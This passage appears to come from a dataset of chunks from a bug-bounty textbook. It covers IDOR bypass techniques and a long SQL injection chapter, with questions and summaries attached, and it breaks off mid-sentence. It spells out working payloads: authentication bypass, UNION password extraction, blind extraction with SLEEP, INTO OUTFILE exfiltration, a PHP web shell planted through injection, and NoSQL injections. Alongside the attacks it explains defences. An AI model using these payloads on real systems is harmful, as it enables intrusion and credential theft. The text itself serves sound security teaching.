often enable\nmultiple request methods on the same endpoint but fail to implement the same\naccess control for each method. For example, if this GET request is not vulner-\nable to IDOR and doesn’t return another user’s resources\nGET example.com/uploads/user1236-01.jpeg\nyou can try to use the DELETE method to delete the resource instead. The\nDELETE method removes the resource from the target URL:\nDELETE example.com/uploads/user1236-01.jpeg\nInsecure Direct Object References 183\nIf POST requests don’t work, you can also try to update another user’s\nresource by using the PUT method. The PUT method updates or creates\nthe resource at the target URL:\nPUT example.com/uploads/user1236-01.jpeg\n(PUT request body)\nNEW_FILE\nAnother trick that often works is switching between POST and GET\nrequests. If there is a POST request like this one\nPOST /get_receipt\n(POST request body)\nreceipt_id=2983\nyou can try rewriting it as a GET request, like this:\nGET /get_receipt?receipt_id=2983\nChange the Requested File Type\nSwitching the file type of the requested file sometimes leads the server to\nprocess the authorization differently. Applications might be flexible about\nhow the user can identify information: they could allow users to either use\nIDs to reference a file or use the filename directly. But applications often\nfail to implement the same access controls for each method of reference.\nFor example, applications commonly store information in the JSON file\ntype. Try adding the .json extension to the end of the request URL and see\nwhat happens. If this request is blocked by the server\nGET /get_receipt?receipt_id=2983\nthen try this one instead:\nGET /get_receipt?receipt_id=2983.json\nEscalating the Attack\nThe impact of an IDOR depends on the affected function, so to maximize\nthe severity of your bugs, you should always look for IDORs in critical func-\ntionalities first. Both read-based IDORs (which leak information but do not\nalter the database) and write-based IDORs (which can alter the database in\nan unauthorized way) can be of high impact.\nIn terms of the state-changing, write-based IDORs, look for IDORs in\npassword reset, password change, and account recovery features, as these\noften have the highest business impact. Target these over, say, a feature that\nchanges email subscription settings.\n184 Chapter 10\nAs for the non-state-changing (read-based) IDORs, look for functional-\nities that handle the sensitive information in the application. For example,\nlook for functionalities that handle direct messages, personal information,\nand private content. Consider which application functionalities make use of\nthis information and look for IDORs accordingly.\nYou can also combine IDORs with other vulnerabilities to increase their\nimpact. For example, a write-based IDOR can be combined with self-XSS\nto form a stored XSS. An IDOR on a password reset endpoint combined\nwith username enumeration can lead to a mass account takeover. Or a\nwrite IDOR on an admin account may even lead to RCE! We’ll talk about\nRCEs in Chapter 18.\nAutomating the Attack\nAfter you get the hang of hunting for IDORs, you can try to automate IDOR\nhunting by using Burp or your own scripts. For example, you can use the\nBurp intruder to iterate through IDs to find valid ones. The Burp extension\nAutorize (https://github.com/Quitten/Autorize/) scans for authorization issues by\naccessing higher-privileged accounts with lower-privileged accounts, whereas\nthe Burp extensions Auto Repeater (https://github.com/nccgroup/AutoRepeater/)\nand AuthMatrix (https://github.com/SecurityInnovation/AuthMatrix/) allow you\nto automate the process of switching out cookies, headers, and parameters.\nFor more information on how to use these tools, go to the Extender tab of\nyour Burp window, then to the BAppStore tab to find the extension you want\nto use.\nFinding Your First IDOR!\nNow that you know what IDORs are, how to bypass IDOR protection, and\nhow to escalate IDORs, you’re ready to look for your first one! Hop on a bug\nbounty program and follow the steps discussed in this chapter:\n1. Create two accounts for each application role and designate one as the\nattacker account and the other as the victim account.\n2. Discover features in the application that might lead to IDORs. Pay atten-\ntion to features that return sensitive information or modify user data.\n3. Revisit the features you discovered in step 2. With a proxy, intercept your\nbrowser traffic while you browse through the sensitive functionalities.\n4. With a proxy, intercept each sensitive request and switch out the IDs\nthat you see in the requests. If switching out IDs grants you access to\nother users’ information or lets you change their data, you might have\nfound an IDOR.\n5. Don’t despair if the application seems to be immune to IDORs. Use\nthis opportunity to try a protection-bypass technique! If the applica-\ntion uses an encoded, hashed, or randomized ID, you can try decoding\nInsecure Direct Object References 185\nor predicting the IDs. You can also try supplying the application with\nan ID when it does not ask for one. Finally, sometimes changing the\nrequest method type or file type makes all the difference.\n6. Monitor for information leaks in export files, email, and text alerts. An\nIDOR now might lead to an info leak in the future.\n7. Draft your first IDOR report!",
    "question": "How can an attacker exploit insecure direct object references (IDORs) to access or modify data that does not belong to them?",
    "summary": "Insecure direct object references (IDORs) occur when a web application allows users to access resources without proper validation, often by using predictable IDs. These vulnerabilities can let attackers view, edit, or delete data that doesn't belong to them. To prevent IDORs, applications should implement access control checks and use randomized or hashed IDs. Attackers can bypass IDOR protections by changing IDs, using encoded or hashed values, or manipulating request methods and file types."
  },
  {
    "start": 132,
    "end": 143,
    "text": "11\nSQL INJECTION\nSQL is a programming language used to\nquery or modify information stored within\na database. A SQL injection is an attack in\nwhich the attacker executes arbitrary SQL\ncommands on an application’s database by supplying\nmalicious input inserted into a SQL statement. This\nhappens when the input used in SQL queries is incor-\nrectly filtered or escaped and can lead to authentica-\ntion bypass, sensitive data leaks, tampering of the\ndatabase, and RCE in some cases.\nSQL injections are on the decline, since most web frameworks now have\nbuilt-in mechanisms that protect against them. But they are still common. If\nyou can find one, they tend to be critical vulnerabilities that result in high\npayouts, so when you first start hunting for vulnerabilities on a target, look-\ning out for them is still worthwhile. In this chapter, we will talk about how\nto find and exploit two types of SQL injections: classic SQL injections\nand blind SQL injections. We will also talk about injections in NoSQL\ndatabases, which are databases that do not use the SQL query language.\nNote that the examples used in this chapter are based on MySQL syn-\ntax. The code for injecting commands into other database types will be\nslightly different, but the overall principles remain the same.\nMechanisms\nTo understand SQL injections, let’s start by understanding what SQL is.\nStructured Query Language (SQL) is a language used to manage and commu-\nnicate with databases.\nTraditionally, a database contains tables, rows, columns, and fields.\nThe rows and columns contain the data, which gets stored in single\nfields. Let’s say that a web application’s database contains a table called\nUsers (Table 11-1). This table contains three columns: ID, Username, and\nPassword. It also contains three rows of data, each storing the credentials\nof a different user.\nTable 11-1: The Example Users\nDatabase Table\nID Username Password\n1 admin t5dJ12rp$fMDEbSWz\n2 vickie password123\n3 jennifer letmein!\nThe SQL language helps you efficiently interact with the data stored\nin databases by using queries. For example, SQL SELECT statements can be\nused to retrieve data from the database. The following query will return the\nentire Users table from the database:\nSELECT * FROM Users;\nThis query would return all usernames in the Users table:\nSELECT Username FROM Users;\nFinally, this query would return all users with the username admin:\nSELECT * FROM Users WHERE Username='admin';\nThere are many more ways to construct a SQL query that interacts\nwith a database. You can learn more about SQL syntax from W3Schools at\nhttps://www.w3schools.com/sql/default.asp.\n188 Chapter 11\nInjecting Code into SQL Queries\nA SQL injection attack occurs when an attacker is able to inject code into the\nSQL statements that the target web application uses to access its database,\nthereby executing whatever SQL code the attacker wishes. For example,\nlet’s say that a website prompts its users for their username and password,\nthen inserts these into a SQL query to log in the user. The following POST\nrequest parameters from the user will be used to populate a SQL query:\nPOST /login\nHost: example.com\n(POST request body)\nusername=vickie&password=password123\nThis SQL query will find the ID of a user that matches the username\nand password provided in the POST request. The application will then log\nin to that user’s account:\nSELECT Id FROM Users\nWHERE Username='vickie' AND Password='password123';\nSo what’s the problem here? Since users can’t predict the passwords of\nothers, they should have no way of logging in as others, right? The issue is\nthat attackers can insert characters that are special to the SQL language to\nmess with the logic of the query. For example, if an attacker submits the fol-\nlowing POST request:\nPOST /login\nHost: example.com\n(POST request body)\nusername=\"admin';-- \"&password=password123\nthe generated SQL query would become this:\nSELECT Id FROM Users\nWHERE Username='admin';-- ' AND Password='password123';\nThe -- sequence denotes the start of a SQL comment, which doesn’t get\ninterpreted as code, so by adding -- into the username part of the query,\nthe attacker effectively comments out the rest of the SQL query. The query\nbecomes this:\nSELECT Id FROM Users WHERE Username='admin';\nThis query will return the admin user’s ID, regardless of the password\nprovided by the attacker. By injecting special characters into the SQL query,\nthe attacker bypassed authentication and can log in as the admin without\nknowing the correct password!\nSQL Injection 189\nAuthentication bypass is not the only thing attackers can achieve with\nSQL injection. Attackers might also be able to retrieve data they shouldn’t\nbe allowed to access. Let’s say a website allows users to access a list of their\nemails by providing the server a username and an access key to prove their\nidentity:\nGET /emails?username=vickie&accesskey=ZB6w0YLjzvAVmp6zvr\nHost: example.com\nThis GET request might generate a query to the database with the fol-\nlowing SQL statement:\nSELECT Title, Body FROM Emails\nWHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr';\nIn this case, attackers can use the SQL query to read data from other\ntables that they should not be able to read. For instance, imagine they sent\nthe following HTTP request to the server:\nGET /emails?username=vickie&accesskey=\"ZB6w0YLjzvAVmp6zvr'\n1 UNION SELECT Username, Password FROM Users;-- \"\nHost: example.com\nThe server would turn the original SQL query into this one:\n1 SELECT Title, Body FROM Emails\nWHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'\n2 UNION 3SELECT Username, Password FROM Users;4-- ;\nThe SQL UNION 2 operator combines the results of two different SELECT\nstatements. Therefore, this query combines the results of the first SELECT\nstatement 1, which returns a user’s emails, and the second SELECT state-\nment 3, which, as described earlier, returns all usernames and passwords\nfrom the Users table. Now the attacker can read all users’ usernames and\npasswords in the HTTP response! (Note that many SQL injection payloads\nwould comment out whatever comes after the injection point 4, to prevent\nthe rest of the query from messing up the syntax or logic of the query.)\nSQL injection isn’t limited to SELECT statements, either. Attackers can\nalso inject code into statements like UPDATE (used to update a record), DELETE\n(used to delete existing records), and INSERT (used to create new entries in\na table). For example, let’s say that this is the HTTP POST request used to\nupdate a user’s password on the target website:\nPOST /change_password\nHost: example.com\n(POST request body)\nnew_password=password12345\n190 Chapter 11\nThe website would form an UPDATE query with your new password and\nthe ID of the currently logged-in user. This query will update the row in the\nUsers table whose ID field is equal to 2, and set its password to password12345:\nUPDATE Users\nSET Password='password12345'\nWHERE Id = 2;\nIn this case, attackers can control the SET clause of the statement, which\nis used to specify which rows should be updated in a table. The attacker can\nconstruct a POST request like this one:\nPOST /change_password\nHost: example.com\n(POST request body)\nnew_password=\"password12345';--\"\nThis request generates the following SQL query:\nUPDATE Users\nSET Password='password12345';-- WHERE Id = 2;\nThe WHERE clause, which specifies the criteria of the rows that should be\nupdated, is commented out in this query. The database would update all\nrows in the table, and change all of the passwords in the Users table to\npassword12345. The attacker can now log in as anyone by using that password.\nUsing Second-Order SQL Injections\nSo far, the SQL injections we’ve discussed are all first-order SQL injections.\nFirst-order SQL injections happen when applications use user-submitted input\ndirectly in a SQL query. On the other hand, second-order SQL injections hap-\npen when user input gets stored into a database, then retrieved and used\nunsafely in a SQL query. Even if applications handle input properly when\nit’s submitted by the user, these vulnerabilities can occur if the application\nmistakenly treats the data as safe when it’s retrieved from the database.\nFor example, consider a web application that allows users to create an\naccount by specifying a username and a password. Let’s say that a malicious\nuser submits the following request:\nPOST /signup\nHost: example.com\n(POST request body)\nusername=\"vickie' UNION SELECT Username, Password FROM Users;--\n\"&password=password123\nThis request submits the username vickie' UNION SELECT Username,\nPassword FROM Users;-- and the password password123 to the /signup endpoint.\nThe username POST request parameter contains a SQL injection payload\nSQL Injection 191\nthat would SELECT all usernames and passwords and concatenate them to the\nresults of the database query.\nThe application properly handles the user input when it’s submitted,\nusing the protection techniques I’ll discuss in the next section. And the\nstring vickie' UNION SELECT Username, Password FROM Users;-- is stored into the\napplication’s database as the attacker’s username.\nLater, the malicious user accesses their email with the following\nGET request:\nGET /emails\nHost: example.com\nIn this case, let’s say that if the user doesn’t provide a username and\nan access key, the application will retrieve the username of the currently\nlogged-in user from the database and use it to populate a SQL query:\nSELECT Title, Body FROM Emails\nWHERE Username='USERNAME'\nBut the attacker’s username, which contains SQL code, will turn the\nSQL query into the following one:\nSELECT Title, Body FROM Emails\nWHERE Username='vickie'\nUNION SELECT Username, Password FROM Users;--\nThis will return all usernames and passwords as email titles and bodies\nin the HTTP response!\nPrevention\nBecause SQL injections are so devastating to an application’s security, you\nmust take action to prevent them. One way you can prevent SQL injections\nis by using prepared statements. Prepared statements are also called parameter-\nized queries, and they make SQL injections virtually impossible.\nBefore we dive into how prepared statements work, it’s important to under-\nstand how SQL queries are executed. SQL is a programming language, and\nyour SQL query is essentially a program. When the SQL program arrives at the\nSQL server, the server will parse, compile, and optimize it. Finally, the server\nwill execute the program and return the results of the execution (Figure 11-1).\nLife of a SQL query\nQuery Results\nParse, compile, Execute\noptimize\nFigure 11-1: Life of a SQL query\n192 Chapter 11\nWhen you insert user-supplied input into your SQL queries, you are\nbasically rewriting your program dynamically, using user input. An attacker\ncan supply data that interferes with the program’s code and alter its logic\n(Figure 11-2).\nLife of a SQL query\nQuery+ User input Results\nParse, compile, Execute\noptimize\nFigure 11-2: A SQL query that concatenates user\ninput into the query before compilation will make\nthe database treat user input as code.\nPrepared statements work by making sure that user-supplied data\ndoes not alter your SQL query’s logic. These SQL statements are sent to\nand compiled by the SQL server before any user-supplied parameters\nare inserted. This means that instead of passing a complete SQL query to\nthe server to be compiled, you define all the SQL logic first, compile it, and\nthen insert user-supplied parameters into the query right before execution\n(Figure 11-3). After the parameters are inserted into the final query, the\nquery will not be parsed and compiled again.\nLife of a SQL query\nQuery Results\nParse, compile, Execute\noptimize + User input\nFigure 11-3: A SQL query that concatenates\nuser input into the query after compilation allows\nthe database to distinguish between the code\npart and the data part of the SQL query.\nAnything that wasn’t in the original statement will be treated as string\ndata, not executable SQL code, so the program logic part of your SQL\nquery will remain intact. This allows the database to distinguish between\nthe code part and the data part of the SQL query, regardless of what the\nuser input looks like.\nLet’s look at an example of how to execute SQL statements safely in\nPHP. Say that we want to retrieve a user’s ID by using their provided user-\nname and password, so we want to execute this SQL statement:\nSELECT Id FROM Users\nWHERE Username=USERNAME AND Password=PASSWORD;\nSQL Injection 193\nHere’s how to do that in PHP:\n$mysqli = new mysqli(\"mysql_host\", \"mysql_username\", \"mysql_password\", \"database_name\"); 1\n$username = $_POST[\"username\"]; 2\n$password = $_POST[\"password\"]; 3\nIn PHP, we first establish a connection with our database 1, and then\nretrieve the username and password as POST parameters from the user 2 3.\nTo use a prepared statement, you would define the structure of the\nquery first. We’ll write out the query without its parameters, and put ques-\ntion marks as placeholders for the parameters:\n$stmt = $mysqli->prepare(\"SELECT Id FROM Users WHERE Username=? AND Password=?\");\nThis query string will now be compiled by the SQL server as SQL code.\nYou can then send over the parameters of the query separately. The follow-\ning line of code will insert the user input into the SQL query:\n$stmt->bind_param(\"ss\", $username, $password);\nFinally, you execute the query:\n$stmt->execute();\nThe username and password values provided by the user aren’t com-\npiled like the statement template, and aren’t executed as the logic part\nof the SQL code. Therefore, if an attacker provides the application with\na malicious input like this one, the entire input would be treated as plain\ndata, not as SQL code:\nPassword12345';--\nHow to use prepared statements depends on the programming lan-\nguage you are using to code your applications. Wikipedia provides a few\nexamples: https://en.wikipedia.org/wiki/Prepared_statement.\nAnother way of preventing SQL injections is to use an allowlist for allowed\nvalues. For example, the SQL ORDER BY clause allows a query to specify the col-\numn by which to sort the results. Therefore, this query will return all of the\nuser’s emails in our table, sorted by the Date column, in descending order:\nSELECT Title, Body FROM Emails\nWHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr';\nORDER BY Date DESC;\nIf the application allows users to specify a column to use for ordering\ntheir email, it can rely on an allowlist of column names for the ORDER BY\nclause instead of allowing arbitrary input from the user. For example, the\napplication can allow only the values Date, Sender, and Title, and reject all\nother user-input values.\n194 Chapter 11\nFinally, you can carefully sanitize and escape user input. However, this\napproach isn’t entirely bulletproof, because it’s easy to miss special char-\nacters that attackers could use to construct a SQL injection attack. Special\ncharacters that should be sanitized or escaped include the single quote (')\nand double quote (\"), but special characters specific to each type of data-\nbase also exist. For more information about SQL input sanitization, read\nOWASP’s cheat sheet at https://cheatsheetseries.owasp.org/cheatsheets/SQL\n_Injection_Prevention_Cheat_Sheet.html.\nHunting for SQL Injections\nLet’s start hunting for SQL injections! Earlier in this chapter, I mentioned\nthat we can classify SQL injections as either first order or second order. But\nthere’s another way of classifying SQL injections that is useful when exploit-\ning them: classic SQL injections, and blind SQL. The approach to detecting\nand exploiting these differs.\nBefore we dive into each type, a common technique for detecting any\nSQL injection is to insert a single quote character (') into every user input\nand look for errors or other anomalies. The single quote is a special character\nin SQL statements that denotes the end of a query string. If the application\nis protected against SQL injections, it should treat the single quote as plain\ndata, and inserting a single quote into the input field should not trigger data-\nbase errors or change the logic of the database query.\nAnother general way of finding SQL injections is fuzzing, which is the\npractice of submitting specifically designed SQL injection payloads to the\napplication and monitoring the server’s response. We will talk about this in\nChapter 25.\nOtherwise, you can submit payloads designed for the target’s database\nintended to trigger a difference in database response, a time delay, or a\ndatabase error. Remember, you’re looking for clues that the SQL code you\ninjected can be executed.\nStep 1: Look for Classic SQL Injections\nClassic SQL injections are the easiest to find and exploit. In classic SQL injec-\ntions, the results of the SQL query are returned directly to the attacker in an\nHTTP response. There are two subtypes: UNION based and error based.\nOur email example earlier is a case of the UNION-based approach: an\nattacker uses the UNION operator to concatenate the results of another query\nonto the web application’s response:\nSELECT Title, Body FROM Emails\nWHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'\nUNION SELECT Username, Password FROM Users;-- ;\nIn this case, the server would return all usernames and passwords along\nwith the user vickie’s emails in the HTTP response (Table 11-2).\nSQL Injection 195\nTable 11-2: Emails That Result from Our Malicious Query\nTitle Body\nFinish setting up your account! Please finish setting up your example.com account by\nsubmitting a recovery email address .\nWelcome Welcome to example.com’s email service\nadmin t5dJ12rp$fMDEbSWz\nvickie password123\njennifer letmein!\nOn the other hand, error-based SQL injection attacks trigger an error\nin the database to collect information from the returned error message. For\nexample, we can induce an error by using the CONVERT() function in MySQL:\nSELECT Title, Body FROM Emails\nWHERE Username='vickie' AND AccessKey='ZB6w0YLjzvAVmp6zvr'\nUNION SELECT 1,\nCONVERT((SELECT Password FROM Users WHERE Username=\"admin\"), DATE); –-\nThe CONVERT(VALUE, FORMAT) function attempts to convert VALUE to the\nformat specified by FORMAT. Therefore, this query will force the database to\nconvert the admin’s password to a date format, which can sometimes cause\nthe database to throw a descriptive error like this one:\nConversion failed when trying to convert \"t5dJ12rp$fMDEbSWz\" to data type \"date\".\nThe database throws descriptive errors to help developers pinpoint\nproblems, but can also accidentally reveal information to outsiders if error\nmessages are shown to regular users as well. In this example, the database\npoints out that it has failed to convert a string value, \"t5dJ12rp$fMDEbSWz\",\nto the date format. But t5dJ12rp$fMDEbSWz is the password of the admin\naccount! By displaying a descriptive error message, the database has acci-\ndentally revealed a sensitive piece of information to outsiders.\nStep 2: Look for Blind SQL Injections\nAlso called inferential SQL injections, blind SQL injections are a little harder\nto detect and exploit. They happen when attackers cannot directly extract\ninformation from the database because the application doesn’t return SQL\ndata or descriptive error messages. In this case, attackers can infer informa-\ntion by sending SQL injection payloads to the server and observing its sub-\nsequent behavior. Blind SQL injections have two subtypes as well: Boolean\nbased and time based.\nBoolean-based SQL injection occurs when attackers infer the structure of\nthe database by injecting test conditions into the SQL query that will return\neither true or false. Using those responses, attackers could slowly infer the\ncontents of the database. For example, let’s say that example.com maintains\na separate table to keep track of the premium members on the platform.\n196 Chapter 11\nPremium members have access to advanced features, and their home pages\ndisplay a Welcome, premium member! banner. The site determines who is pre-\nmium by using a cookie that contains the user’s ID and matching it against\na table of registered premium members. The GET request containing such\na cookie might look like this:\nGET /\nHost: example.com\nCookie: user_id=2\nThe application uses this request to produce the following SQL query:\nSELECT * FROM PremiumUsers WHERE Id='2';\nIf this query returns data, the user is a premium member, and the\nWelcome, premium member! banner will be displayed. Otherwise, the banner\nwon’t be displayed. Let’s say your account isn’t premium. What would hap-\npen if you submit this user ID instead?\n2' UNION SELECT Id FROM Users\nWHERE Username = 'admin'\nand SUBSTR(Password, 1, 1) ='a';--\nWell, the query would become the following:\nSELECT * FROM PremiumUsers WHERE Id='2'\nUNION SELECT Id FROM Users\nWHERE Username = 'admin'\nand 1SUBSTR(Password, 1, 1) = 'a';--\nThe SUBSTR(STRING, POSITION, LENGTH) function extracts a substring from\nthe STRING, of a specified LENGTH, at the specified POSITION in that string.\nTherefore, SUBSTR(Password, 1, 1) 1 returns the first character of each user’s\npassword. Since user 2 isn’t a premium member, whether this query returns\ndata will depend on the second SELECT statement, which returns data if the\nadmin account’s password starts with an a. This means you can brute-force\nthe admin’s password; if you submit this user ID as a cookie, the web appli-\ncation would display the premium banner if the admin account’s password\nstarts with an a. You could try this query with the letters b, c, and so on,\nuntil it works.\nYou can use this technique to extract key pieces of information from the\ndatabase, such as the database version, table names, column names, and cre-\ndentials. I talk more about this in “Escalating the Attack” on page 201.\nA time-based SQL injection is similar, but instead of relying on a visual cue\nin the web application, the attacker relies on the response-time difference\ncaused by different SQL injection payloads. For example, what might hap-\npen if the injection point from our preceding example doesn’t return any\nvisual clues about the query’s results? Let’s say premium members don’t get\na special banner, and their user interfaces don’t look any different. How do\nyou exploit this SQL injection then?\nSQL Injection 197\nIn many databases, you can trigger a time delay by using a SQL query.\nIf the time delay occurs, you’ll know the query worked correctly. Try using\nan IF statement in the SQL query:\nIF(CONDITION, IF-TRUE, IF-FALSE)\nFor example, say you submit the following ID:\n2' UNION SELECT\nIF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0)\nPassword FROM Users\nWHERE Username = 'admin';\nThe SQL query would become the following:\nSELECT * FROM PremiumUsers WHERE Id='2'\nUNION SELECT\nIF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0)\nPassword FROM Users\nWHERE Username = 'admin';\nThe SLEEP(SECONDS) function in MySQL will create a time delay in the\nresponse for the specified number of seconds. This query will instruct the\ndatabase to sleep for 10 seconds if the admin’s password starts with an a char-\nacter. Using this technique, you can slowly figure out the admin’s password.\nStep 3: Exfiltrate Information by Using SQL Injections\nImagine that the web application you’re attacking doesn’t use your input in\na SQL query right away. Instead, it uses the input unsafely in a SQL query\nduring a backend operation, so you have no way to retrieve the results of\ninjection via an HTTP response, or infer the query’s results by observing\nserver behavior. Sometimes there’s even a time delay between when you\nsubmitted the payload and when the payload gets used in an unsafe query,\nso you won’t immediately be able to observe differences in the application’s\nbehavior.\nIn this case, you’ll need to make the database store information some-\nwhere when it does run the unsafe SQL query. In MySQL, the SELECT. . .INTO\nstatement tells the database to store the results of a query in an output file on\nthe local machine. For example, the following query will cause the database\nto write the admin’s password into /var/www/html/output.txt, a file located on\nthe web root of the target web server:\nSELECT Password FROM Users WHERE Username='admin'\nINTO OUTFILE '/var/www/html/output.txt'\nWe upload to the /var/www/html directory because it’s the default\nweb directory for many Linux web servers. Then you can simply access\n198 Chapter 11\nthe information by navigating to the /output.txt page on the target: https://\nexample.com/output.txt. This technique is also a good way to detect second-\norder SQL injections, since in second-order SQL injections, there is often a\ntime delay between the malicious input and the SQL query being executed.\nLet’s put this information in context. Say that when you browse example\n.com, the application adds you to a database table to keep track of currently\nactive users. Accessing a page with a cookie, like this\nGET /\nHost: example.com\nCookie: user_id=2, username=vickie\nwill cause the application to add you to a table of active users. In this example,\nthe ActiveUsers table contains only two columns: one for the user ID and one\nfor the username of the logged-in user. The application uses an INSERT state-\nment to add you to the ActiveUsers table. INSERT statements add a row into the\nspecified table with the specified values:\nINSERT INTO ActiveUsers\nVALUES ('2', 'vickie');\nIn this case, an attacker can craft a malicious cookie to inject into the\nINSERT statement:\nGET /\nHost: example.com\nCookie: 1user_id=\"2', (SELECT Password FROM Users\nWHERE Username='admin'\nINTO OUTFILE '/var/www/html/output.txt'));-- \", username=vickie\nThis cookie 1 will, in turn, cause the INSERT statement to save the\nadmin’s password into the output.txt file on the victim server:\nINSERT INTO ActiveUsers\nVALUES ('2', (SELECT Password FROM Users\nWHERE Username='admin'\nINTO OUTFILE '/var/www/html/output.txt'));-- ', 'vickie');\nFinally, you will find the password of the admin account stored into the\noutput.txt file on the target server.\nStep 4: Look for NoSQL Injections\nDatabases don’t always use SQL. NoSQL, or Not Only SQL, databases are\nthose that don’t use the SQL language. Unlike SQL databases, which store\ndata in tables, NoSQL databases store data in other structures, such as\nkey-value pairs and graphs. NoSQL query syntax is database-specific, and\nqueries are often written in the programming language of the applica-\ntion. Modern NoSQL databases, such as MongoDB, Apache CouchDB,\nand Apache Cassandra, are also vulnerable to injection attacks. These vul-\nnerabilities are becoming more common as NoSQL rises in popularity.\nSQL Injection 199\nTake MongoDB, for example. In MongoDB syntax, Users.find()\nreturns users that meet a certain criteria. For example, the following\nquery returns users with the username vickie and the password password123:\nUsers.find({username: 'vickie', password: 'password123'});\nIf the application uses this functionality to log in users and populates\nthe database query directly with user input, like this:\nUsers.find({username: $username, password: $password});\nattackers can submit the password {$ne: \"\"} to log in as anyone. For example,\nlet’s say that the attacker submits a username of admin and a password of\n{$ne: \"\"}. The database query would become as follows:\nUsers.find({username: 'admin', password: {$ne: \"\"}});\nIn MongoDB, $ne selects objects whose value is not equal to the speci-\nfied value. Here, the query would return users whose username is admin\nand password isn’t equal to an empty string, which is true unless the admin\nhas a blank password! The attacker can thus bypass authentication and gain\naccess to the admin account.\nInjecting into MongoDB queries can also allow attackers to execute\narbitrary JavaScript code on the server. In MongoDB, the $where, mapReduce,\n$accumulator, and $function operations allow developers to run arbitrary\nJavaScript. For example, you can define a function within the $where opera-\ntor to find users named vickie:\nUsers.find( { $where: function() {\nreturn (this.username == 'vickie') } } );\nSay the developer allows unvalidated user input in this function and\nuses that to fetch account data, like this:\nUsers.find( { $where: function() {\nreturn (this.username == $user_input) } } );\nIn that case, an attacker can execute arbitrary JavaScript code by\ninjecting it into the $where operation. For example, the following piece of\nmalicious code will launch a denial-of-service (DoS) attack by triggering a\nnever-ending while loop:\nUsers.find( { $where: function() {\nreturn (this.username == 'vickie'; while(true){};) } } );\nThe process of looking for NoSQL injections is similar to detecting\nSQL injections. You can insert special characters such as quotes (' \"), semi-\ncolons (;), and backslashes (\\), as well as parentheses (()), brackets([]), and\nbraces ({}) into user-input fields and look for errors or other anomalies.\nYou can also automate the hunting process by using the tool NoSQLMap\n(https://github.com/codingo/NoSQLMap/).\n200 Chapter 11\nDevelopers can prevent NoSQL injection attacks by validating user input\nand avoiding dangerous database functionalities. In MongoDB, you can dis-\nable the running of server-side JavaScript by using the --noscripting option\nin the command line or setting the security.javascriptEnabled flag in the\nconfiguration file to false. Find more information at https://docs.mongodb.com/\nmanual/faq/fundamentals/index.html.\nAdditionally, you should follow the principle of least privilege when\nassigning rights to applications. This means that applications should run\nwith only the privileges they require to operate. For example, when an\napplication requires only read access to a file, it should not be granted any\nwrite or execute permissions. This will lower your risk of complete system\ncompromise during an attack.\nEscalating the Attack\nAttackers most often use SQL injections to extract information from the\ndatabase. Successfully collecting data from a SQL injection is a technical\ntask that can sometimes be complicated. Here are some tips you can use to\ngain information about a target for exploitation.\nLearn About the Database\nFirst, it’s useful to gain information about the structure of the database.\nNotice that many of the payloads that I’ve used in this chapter require some\nknowledge of the database, such as table names and field names.\nTo start with, you need to determine the database software and its struc-\nture. Attempt some trial-and-error SQL queries to determine the database\nversion. Each type of database will have different functions for returning\ntheir version numbers, but the query should look something like this:\nSELECT Title, Body FROM Emails\nWHERE Username='vickie'\nUNION SELECT 1, @@version;--\nSome common commands for querying the version type are @@version\nfor Microsoft SQL Server and MySQL, version() for PostgreSQL, and\nv$version for Oracle. The 1 in the UNION SELECT 1, DATABASE_VERSION_QUERY;-- line\nis necessary, because for a UNION statement to work, the two SELECT statements\nit connects need to have the same number of columns. The first 1 is essen-\ntially a dummy column name that you can use to match column numbers.\nOnce you know the kind of database you’re working with, you could\nstart to scope it out further to see what it contains. This query in MySQL\nwill show you the table names of user-defined tables:\nSELECT Title, Body FROM Emails\nWHERE Username='vickie'\nUNION SELECT 1, table_name FROM information_schema.tables\nSQL Injection 201\nAnd this one will show you the column names of the specified table. In\nthis case, the query will list the columns in the Users table:\nSELECT Title, Body FROM Emails\nWHERE Username='vickie'\nUNION SELECT 1, column_name FROM information_schema.columns\nWHERE table_name = 'Users'\nAll of these techniques are possible during classic and blind attacks.\nYou just need to find a different way to fit those commands into your con-\nstructed queries. For instance, you can determine a database’s version with\na time-based technique like so:\nSELECT * FROM PremiumUsers WHERE Id='2'\nUNION SELECT IF(SUBSTR(@@version, 1, 1) = '1', SLEEP(10), 0); --\nAfter you’ve learned about the database’s structure, start targeting cer-\ntain tables to exfiltrate data that interests you.\nGain a Web Shell\nAnother way to escalate SQL injections is to attempt to gain a web shell on\nthe server. Let’s say we’re targeting a PHP application. The following piece\nof PHP code will take the request parameter named cmd and execute it as a\nsystem command:\n<? system($_REQUEST['cmd']); ?>\nYou can use the SQL injection vulnerability to upload this PHP\ncode to a location that you can access on the server by using INTO OUTFILE. For\nexample, you can write the password of a nonexistent user and the PHP code\n<? system($_REQUEST['cmd']); ?> into a file located at /var/www/html/shell.php on\nthe target server:\nSELECT Password FROM Users WHERE Username='abc'\nUNION SELECT \"<? system($_REQUEST['cmd']); ?>\"\nINTO OUTFILE \"/var/www/html/shell.php\"\nSince the password of the nonexistent user will be blank, you are essen-\ntially uploading the PHP script to the shell.php file. Then you can simply\naccess your shell.php file and execute any command you wish:\nhttp://www.example.com/shell.php?cmd=COMMAND\nAutomating SQL Injections\nTesting for SQL injection manually isn’t scalable. I recommend using tools\nto help you automate the entire process described in this chapter, from SQL\ninjection discovery to exploitation. For example, sqlmap (http://sqlmap.org/) is a\ntool written in Python that automates the process of detecting and exploiting\n202 Chapter 11\nSQL injection vulnerabilities. A full tutorial of sqlmap is beyond the scope of\nthis book, but you can find its documentation at https://github.com/sqlmapproject/\nsqlmap/wiki/.\nBefore diving into automating your attacks with sqlmap, make sure you\nunderstand each of its techniques so you can optimize your attacks. Most of\nthe techniques it uses are covered in this chapter. You can either use sqlmap\nas a standalone tool or integrate it with the testing proxy you’re using. For\nexample, you can integrate sqlmap into Burp by installing the SQLiPy Burp\nplug-in.\nFinding Your First SQL Injection!\nSQL injections are an exciting vulnerability to find and exploit, so dive into\nfinding one on a practice application or bug bounty program. Since SQL\ninjections are sometimes quite complex to exploit, start by attacking a delib-\nerately vulnerable application like the Damn Vulnerable Web Application for\npractice, if you’d like. You can find it at http://www.dvwa.co.uk/. Then follow\nthis road map to start finding real SQL injection vulnerabilities in the wild:\n1. Map any of the application’s endpoints that take in user input.\n2. Insert test payloads into these locations to discover whether 